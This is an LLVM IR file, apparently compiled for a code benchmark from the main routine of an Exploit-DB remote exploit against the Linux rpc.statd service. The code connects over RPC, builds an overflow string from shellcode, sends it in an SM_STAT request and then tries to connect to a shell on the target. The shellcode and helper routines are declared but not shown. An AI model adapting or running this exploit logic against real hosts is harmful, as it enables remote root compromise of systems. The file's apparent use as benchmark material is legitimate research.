; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20077.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20077.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_10__ = type { i8*, i32, i32, i32, i64 }
%struct.TYPE_9__ = type { i32 }
%struct.timeval = type { i32, i64 }
%struct.sm_name = type { i8* }
%struct.sm_stat_res = type { i32, i64 }
%struct.sockaddr_in = type { i32, i32, i32 }

@shellcode = common dso_local global i8* null, align 8
@RPC_ANYSOCK = common dso_local global i32 0, align 4
@opterr = external dso_local global i32, align 4
@.str = private unnamed_addr constant [16 x i8] c"tp:a:l:o:w:s:d:\00", align 1
@optarg = external dso_local global i8*, align 8
@.str.1 = private unnamed_addr constant [4 x i8] c"%hu\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"%lx\00", align 1
@optind = external dso_local global i32, align 4
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [26 x i8] c"No target host specified\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [14 x i8] c"Invalid type\0A\00", align 1
@types = common dso_local global %struct.TYPE_10__* null, align 8
@.str.5 = private unnamed_addr constant [29 x i8] c"No buffer address specified\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SM_PROG = common dso_local global i32 0, align 4
@SM_VERS = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [17 x i8] c"clntudp_create()\00", align 1
@CLSET_RETRY_TIMEOUT = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [17 x i8] c"clnttcp_create()\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@SM_STAT = common dso_local global i32 0, align 4
@xdr_sm_name = common dso_local global i64 0, align 8
@xdr_sm_stat_res = common dso_local global i64 0, align 8
@RPC_SUCCESS = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [12 x i8] c"clnt_call()\00", align 1
@.str.10 = private unnamed_addr constant [58 x i8] c"A timeout was expected. Attempting connection to shell..\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"Failed\0A\00", align 1
@.str.12 = private unnamed_addr constant [50 x i8] c"Failed - statd returned res_stat: (%s) state: %d\0A\00", align 1
@.str.13 = private unnamed_addr constant [8 x i8] c"failure\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"success\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.TYPE_9__*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.timeval, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca %struct.sm_name, align 8
  %13 = alloca %struct.sm_stat_res, align 8
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i64, align 8
  %24 = alloca i64, align 8
  %25 = alloca i32, align 4
  %26 = alloca { i64, i32 }, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 -1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 5, i32* %17, align 4
  store i32 9, i32* %18, align 4
  store i32 600, i32* %19, align 4
  store i32 1024, i32* %20, align 4
  %27 = load i8*, i8** @shellcode, align 8
  store i8* %27, i8** %22, align 8
  store i64 0, i64* %23, align 8
  store i64 0, i64* %24, align 8
  %28 = load i32, i32* @RPC_ANYSOCK, align 4
  store i32 %28, i32* %25, align 4
  store i32 0, i32* @opterr, align 4
  br label %29

29:                                               ; preds = %63, %2
  %30 = load i32, i32* %4, align 4
  %31 = load i8**, i8*** %5, align 8
  %32 = call i32 @getopt(i32 %30, i8** %31, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  store i32 %32, i32* %6, align 4
  %33 = icmp ne i32 %32, -1
  br i1 %33, label %34, label %64

34:                                               ; preds = %29
  %35 = load i32, i32* %6, align 4
  switch i32 %35, label %58 [
    i32 116, label %36
    i32 112, label %37
    i32 97, label %40
    i32 108, label %43
    i32 111, label %46
    i32 115, label %49
    i32 119, label %52
    i32 100, label %55
  ]

36:                                               ; preds = %34
  store i32 1, i32* %16, align 4
  br label %63

37:                                               ; preds = %34
  %38 = load i8*, i8** @optarg, align 8
  %39 = call i32 @sscanf(i8* %38, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i64* %23)
  br label %63

40:                                               ; preds = %34
  %41 = load i8*, i8** @optarg, align 8
  %42 = call i32 @sscanf(i8* %41, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i64* %24)
  br label %63

43:                                               ; preds = %34
  %44 = load i8*, i8** @optarg, align 8
  %45 = call i32 @atoi(i8* %44)
  store i32 %45, i32* %20, align 4
  br label %63

46:                                               ; preds = %34
  %47 = load i8*, i8** @optarg, align 8
  %48 = call i32 @atoi(i8* %47)
  store i32 %48, i32* %19, align 4
  br label %63

49:                                               ; preds = %34
  %50 = load i8*, i8** @optarg, align 8
  %51 = call i32 @atoi(i8* %50)
  store i32 %51, i32* %17, align 4
  br label %63

52:                                               ; preds = %34
  %53 = load i8*, i8** @optarg, align 8
  %54 = call i32 @atoi(i8* %53)
  store i32 %54, i32* %18, align 4
  br label %63

55:                                               ; preds = %34
  %56 = load i8*, i8** @optarg, align 8
  %57 = call i32 @atoi(i8* %56)
  store i32 %57, i32* %15, align 4
  br label %63

58:                                               ; preds = %34
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 0
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @usage(i8* %61)
  br label %63

63:                                               ; preds = %58, %55, %52, %49, %46, %43, %40, %37, %36
  br label %29

64:                                               ; preds = %29
  %65 = load i8**, i8*** %5, align 8
  %66 = load i32, i32* @optind, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  %69 = load i8*, i8** %68, align 8
  store i8* %69, i8** %21, align 8
  %70 = icmp ne i8* %69, null
  br i1 %70, label %76, label %71

71:                                               ; preds = %64
  %72 = load i32, i32* @stderr, align 4
  %73 = call i32 @fprintf(i32 %72, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0))
  %74 = load i32, i32* @EXIT_FAILURE, align 4
  %75 = call i32 @exit(i32 %74) #4
  unreachable

76:                                               ; preds = %64
  %77 = load i32, i32* %15, align 4
  %78 = icmp sge i32 %77, 0
  br i1 %78, label %79, label %119

79:                                               ; preds = %76
  %80 = load i32, i32* %15, align 4
  %81 = sext i32 %80 to i64
  %82 = icmp uge i64 %81, -1
  br i1 %82, label %83, label %88

83:                                               ; preds = %79
  %84 = load i32, i32* @stderr, align 4
  %85 = call i32 @fprintf(i32 %84, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %86 = load i32, i32* @EXIT_FAILURE, align 4
  %87 = call i32 @exit(i32 %86) #4
  unreachable

88:                                               ; preds = %79
  %89 = load %struct.TYPE_10__*, %struct.TYPE_10__** @types, align 8
  %90 = load i32, i32* %15, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %89, i64 %91
  %93 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %92, i32 0, i32 0
  %94 = load i8*, i8** %93, align 8
  store i8* %94, i8** %22, align 8
  %95 = load %struct.TYPE_10__*, %struct.TYPE_10__** @types, align 8
  %96 = load i32, i32* %15, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %95, i64 %97
  %99 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %98, i32 0, i32 4
  %100 = load i64, i64* %99, align 8
  store i64 %100, i64* %24, align 8
  %101 = load %struct.TYPE_10__*, %struct.TYPE_10__** @types, align 8
  %102 = load i32, i32* %15, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %101, i64 %103
  %105 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %104, i32 0, i32 1
  %106 = load i32, i32* %105, align 8
  store i32 %106, i32* %20, align 4
  %107 = load %struct.TYPE_10__*, %struct.TYPE_10__** @types, align 8
  %108 = load i32, i32* %15, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %107, i64 %109
  %111 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %110, i32 0, i32 2
  %112 = load i32, i32* %111, align 4
  store i32 %112, i32* %19, align 4
  %113 = load %struct.TYPE_10__*, %struct.TYPE_10__** @types, align 8
  %114 = load i32, i32* %15, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %113, i64 %115
  %117 = getelementptr inbounds %struct.TYPE_10__, %struct.TYPE_10__* %116, i32 0, i32 3
  %118 = load i32, i32* %117, align 8
  store i32 %118, i32* %18, align 4
  br label %119

119:                                              ; preds = %88, %76
  %120 = load i64, i64* %24, align 8
  %121 = icmp ne i64 %120, 0
  br i1 %121, label %127, label %122

122:                                              ; preds = %119
  %123 = load i32, i32* @stderr, align 4
  %124 = call i32 @fprintf(i32 %123, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.5, i64 0, i64 0))
  %125 = load i32, i32* @EXIT_FAILURE, align 4
  %126 = call i32 @exit(i32 %125) #4
  unreachable

127:                                              ; preds = %119
  %128 = call i32 @bzero(%struct.sockaddr_in* %14, i32 12)
  %129 = load i32, i32* @AF_INET, align 4
  %130 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %129, i32* %130, align 4
  %131 = load i64, i64* %23, align 8
  %132 = call i32 @htons(i64 %131)
  %133 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i32 %132, i32* %133, align 4
  %134 = load i8*, i8** %21, align 8
  %135 = call i32 @getip(i8* %134)
  %136 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i32 %135, i32* %136, align 4
  %137 = load i32, i32* %17, align 4
  %138 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i32 %137, i32* %138, align 8
  %139 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %139, align 8
  %140 = load i32, i32* %16, align 4
  %141 = icmp ne i32 %140, 0
  br i1 %141, label %164, label %142

142:                                              ; preds = %127
  %143 = load i32, i32* @SM_PROG, align 4
  %144 = load i32, i32* @SM_VERS, align 4
  %145 = bitcast %struct.timeval* %10 to { i32, i64 }*
  %146 = getelementptr inbounds { i32, i64 }, { i32, i64 }* %145, i32 0, i32 0
  %147 = load i32, i32* %146, align 8
  %148 = getelementptr inbounds { i32, i64 }, { i32, i64 }* %145, i32 0, i32 1
  %149 = load i64, i64* %148, align 8
  %150 = call %struct.TYPE_9__* @clntudp_create(%struct.sockaddr_in* %14, i32 %143, i32 %144, i32 %147, i64 %149, i32* %25)
  store %struct.TYPE_9__* %150, %struct.TYPE_9__** %8, align 8
  %151 = load %struct.TYPE_9__*, %struct.TYPE_9__** %8, align 8
  %152 = icmp eq %struct.TYPE_9__* %151, null
  br i1 %152, label %153, label %157

153:                                              ; preds = %142
  %154 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0))
  %155 = load i32, i32* @EXIT_FAILURE, align 4
  %156 = call i32 @exit(i32 %155) #4
  unreachable

157:                                              ; preds = %142
  %158 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i32 2, i32* %158, align 8
  %159 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %159, align 8
  %160 = load %struct.TYPE_9__*, %struct.TYPE_9__** %8, align 8
  %161 = load i32, i32* @CLSET_RETRY_TIMEOUT, align 4
  %162 = bitcast %struct.timeval* %11 to i8*
  %163 = call i32 @clnt_control(%struct.TYPE_9__* %160, i32 %161, i8* %162)
  br label %175

164:                                              ; preds = %127
  %165 = load i32, i32* @SM_PROG, align 4
  %166 = load i32, i32* @SM_VERS, align 4
  %167 = call %struct.TYPE_9__* @clnttcp_create(%struct.sockaddr_in* %14, i32 %165, i32 %166, i32* %25, i32 0, i32 0)
  store %struct.TYPE_9__* %167, %struct.TYPE_9__** %8, align 8
  %168 = load %struct.TYPE_9__*, %struct.TYPE_9__** %8, align 8
  %169 = icmp eq %struct.TYPE_9__* %168, null
  br i1 %169, label %170, label %174

170:                                              ; preds = %164
  %171 = call i32 @clnt_pcreateerror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i64 0, i64 0))
  %172 = load i32, i32* @EXIT_FAILURE, align 4
  %173 = call i32 @exit(i32 %172) #4
  unreachable

174:                                              ; preds = %164
  br label %175

175:                                              ; preds = %174, %157
  %176 = call i32 @authunix_create(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), i32 0, i32 0, i32 0, i32* null)
  %177 = load %struct.TYPE_9__*, %struct.TYPE_9__** %8, align 8
  %178 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %177, i32 0, i32 0
  store i32 %176, i32* %178, align 4
  %179 = load i8*, i8** %22, align 8
  %180 = load i64, i64* %24, align 8
  %181 = load i32, i32* %20, align 4
  %182 = load i32, i32* %19, align 4
  %183 = load i32, i32* %18, align 4
  %184 = call i8* @wizardry(i8* %179, i64 %180, i32 %181, i32 %182, i32 %183)
  store i8* %184, i8** %7, align 8
  %185 = load i8*, i8** %7, align 8
  %186 = getelementptr inbounds %struct.sm_name, %struct.sm_name* %12, i32 0, i32 0
  store i8* %185, i8** %186, align 8
  %187 = load %struct.TYPE_9__*, %struct.TYPE_9__** %8, align 8
  %188 = load i32, i32* @SM_STAT, align 4
  %189 = load i64, i64* @xdr_sm_name, align 8
  %190 = trunc i64 %189 to i32
  %191 = ptrtoint %struct.sm_name* %12 to i32
  %192 = load i64, i64* @xdr_sm_stat_res, align 8
  %193 = trunc i64 %192 to i32
  %194 = ptrtoint %struct.sm_stat_res* %13 to i32
  %195 = call i32 @clnt_call(%struct.TYPE_9__* %187, i32 %188, i32 %190, i32 %191, i32 %193, i32 %194, %struct.timeval* byval(%struct.timeval) align 8 %10)
  store i32 %195, i32* %9, align 4
  %196 = load i32, i32* %9, align 4
  %197 = load i32, i32* @RPC_SUCCESS, align 4
  %198 = icmp ne i32 %196, %197
  br i1 %198, label %199, label %212

199:                                              ; preds = %175
  %200 = load %struct.TYPE_9__*, %struct.TYPE_9__** %8, align 8
  %201 = call i32 @clnt_perror(%struct.TYPE_9__* %200, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0))
  %202 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.10, i64 0, i64 0))
  %203 = call i32 @sleep(i32 5)
  %204 = bitcast { i64, i32 }* %26 to i8*
  %205 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %204, i8* align 4 %205, i64 12, i1 false)
  %206 = getelementptr inbounds { i64, i32 }, { i64, i32 }* %26, i32 0, i32 0
  %207 = load i64, i64* %206, align 4
  %208 = getelementptr inbounds { i64, i32 }, { i64, i32 }* %26, i32 0, i32 1
  %209 = load i32, i32* %208, align 4
  %210 = call i32 @connection(i64 %207, i32 %209)
  %211 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0))
  br label %221

212:                                              ; preds = %175
  %213 = getelementptr inbounds %struct.sm_stat_res, %struct.sm_stat_res* %13, i32 0, i32 1
  %214 = load i64, i64* %213, align 8
  %215 = icmp ne i64 %214, 0
  %216 = zext i1 %215 to i64
  %217 = select i1 %215, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0)
  %218 = getelementptr inbounds %struct.sm_stat_res, %struct.sm_stat_res* %13, i32 0, i32 0
  %219 = load i32, i32* %218, align 8
  %220 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.12, i64 0, i64 0), i8* %217, i32 %219)
  br label %221

221:                                              ; preds = %212, %199
  %222 = load i8*, i8** %7, align 8
  %223 = call i32 @free(i8* %222)
  %224 = load %struct.TYPE_9__*, %struct.TYPE_9__** %8, align 8
  %225 = call i32 @clnt_destroy(%struct.TYPE_9__* %224)
  ret i32 -1
}

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @sscanf(i8*, i8*, i64*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @htons(i64) #1

declare dso_local i32 @getip(i8*) #1

declare dso_local %struct.TYPE_9__* @clntudp_create(%struct.sockaddr_in*, i32, i32, i32, i64, i32*) #1

declare dso_local i32 @clnt_pcreateerror(i8*) #1

declare dso_local i32 @clnt_control(%struct.TYPE_9__*, i32, i8*) #1

declare dso_local %struct.TYPE_9__* @clnttcp_create(%struct.sockaddr_in*, i32, i32, i32*, i32, i32) #1

declare dso_local i32 @authunix_create(i8*, i32, i32, i32, i32*) #1

declare dso_local i8* @wizardry(i8*, i64, i32, i32, i32) #1

declare dso_local i32 @clnt_call(%struct.TYPE_9__*, i32, i32, i32, i32, i32, %struct.timeval* byval(%struct.timeval) align 8) #1

declare dso_local i32 @clnt_perror(%struct.TYPE_9__*, i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @connection(i64, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @clnt_destroy(%struct.TYPE_9__*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
